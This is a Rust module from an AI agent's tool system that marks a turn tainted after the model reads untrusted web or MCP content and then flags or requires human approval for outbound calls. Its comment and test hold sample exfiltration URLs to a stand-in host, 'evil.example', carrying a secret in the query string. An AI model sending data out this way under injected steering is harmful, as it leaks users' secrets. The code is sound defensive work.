//! Taint-aware escalation (spec: tool-system, Taint-aware escalation).
//!
//! Once an untrusted result (a web page, an MCP server's output...) enters
//! a turn, the turn is tainted: text the model read there may be steering
//! it. While it is, every later call of that turn that sends data out of
//! the machine is flagged: under `approvals.taint_policy = "ask"` it needs
//! a human approval unless its target was approved earlier in the session,
//! under `warn` (the default) it is only annotated, under `off` nothing is
//! tracked.
//!
//! What sends data out: a tool whose effect is `external` (its target is
//! the host of the URL it names, else the command it runs, else the tool),
//! and any other call naming a URL with a query string, which a plain read
//! carries to that host (`web_extract` of `https://evil.example/?q=...`).

use std::sync::{Mutex, PoisonError};

use serde_json::Value;

use crate::descriptor::{Effect, RegisteredTool};

/// The prefix of a taint approval's rule key (`plugin_rule:taint:<target>`
/// once remembered for the session).
pub const RULE_PREFIX: &str = "taint:";

/// The detector name of taint findings.
pub const DETECTOR: &str = "taint";

/// The taint of one session's current turn.
#[derive(Debug, Default)]
pub struct Taint {
    /// The tainted turn and where its untrusted content came from.
    turn: Mutex<Option<(String, String)>>,
}

impl Taint {
    /// Marks `turn` tainted by content from `source` (the first source of
    /// a turn is kept).
    pub fn mark(&self, turn: &str, source: &str) {
        let mut current = self.turn.lock().unwrap_or_else(PoisonError::into_inner);
        if current.as_ref().is_none_or(|(t, _)| t != turn) {
            *current = Some((turn.to_owned(), source.to_owned()));
        }
    }

    /// Where the untrusted content of `turn` came from, when it is
    /// tainted.
    #[must_use]
    pub fn source(&self, turn: &str) -> Option<String> {
        self.turn
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .as_ref()
            .filter(|(t, _)| t == turn)
            .map(|(_, source)| source.clone())
    }
}

/// The targets a call of `tool` with `arguments` sends data to; empty for
/// a call that sends nothing out.
#[must_use]
pub fn targets(tool: &RegisteredTool, arguments: &Value) -> Vec<String> {
    let urls = urls(arguments);
    if tool.descriptor.effect == Effect::External {
        let hosts: Vec<String> = urls.iter().filter_map(host).collect();
        if !hosts.is_empty() {
            return hosts;
        }
        let command = ["command", "code"]
            .iter()
            .find_map(|key| arguments.get(key).and_then(Value::as_str));
        return vec![command.map_or_else(|| tool.name().to_owned(), |c| c.trim().to_owned())];
    }
    urls.iter()
        .filter(|url| url.query().is_some_and(|q| !q.is_empty()))
        .filter_map(host)
        .collect()
}

/// The note a flagged call carries: where the turn's untrusted content
/// came from and where the call sends data.
#[must_use]
pub fn note(source: &str, tool: &str, target: &str) -> String {
    format!(
        "this turn read untrusted content ({source}); {tool} sends data to {target}, which this session has not approved"
    )
}

/// The URLs a call's arguments name (`url`, `uri`, `endpoint`, `urls`).
fn urls(arguments: &Value) -> Vec<url::Url> {
    let single = ["url", "uri", "endpoint"]
        .iter()
        .filter_map(|key| arguments.get(key).and_then(Value::as_str));
    let listed = arguments
        .get("urls")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(Value::as_str);
    single
        .chain(listed)
        .filter_map(|text| url::Url::parse(text).ok())
        .collect()
}

fn host(url: &url::Url) -> Option<String> {
    url.host_str().map(str::to_ascii_lowercase)
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;
    use crate::descriptor::Owner;

    fn tool(name: &str, effect: Effect) -> RegisteredTool {
        let mut tool = crate::testing::tool(name, "test", Owner::Builtin);
        tool.descriptor.effect = effect;
        tool
    }

    #[test]
    fn outbound_targets_are_hosts_commands_or_query_carrying_reads() {
        let extract = tool("web_extract", Effect::None);
        let both =
            json!({"urls": ["https://docs.example/page", "https://evil.example/c?d=secret"]});
        assert_eq!(targets(&extract, &both), ["evil.example"]);
        assert!(targets(&extract, &json!({"urls": ["https://docs.example/a"]})).is_empty());
        let terminal = tool("terminal", Effect::External);
        assert_eq!(
            targets(&terminal, &json!({"command": " curl x "})),
            ["curl x"]
        );
        let post = tool("http_post", Effect::External);
        assert_eq!(
            targets(&post, &json!({"url": "https://API.example/v1"})),
            ["api.example"]
        );
        assert_eq!(targets(&post, &json!({})), ["http_post"]);
        assert!(targets(&tool("read_file", Effect::None), &json!({"path": "x"})).is_empty());
    }

    #[test]
    fn a_turn_stays_tainted_until_the_next_turn() {
        let taint = Taint::default();
        assert_eq!(taint.source("t1"), None);
        taint.mark("t1", "web");
        taint.mark("t1", "mcp:other");
        assert_eq!(taint.source("t1").as_deref(), Some("web"));
        assert_eq!(taint.source("t2"), None);
        taint.mark("t2", "browser");
        assert_eq!(taint.source("t1"), None);
    }
}
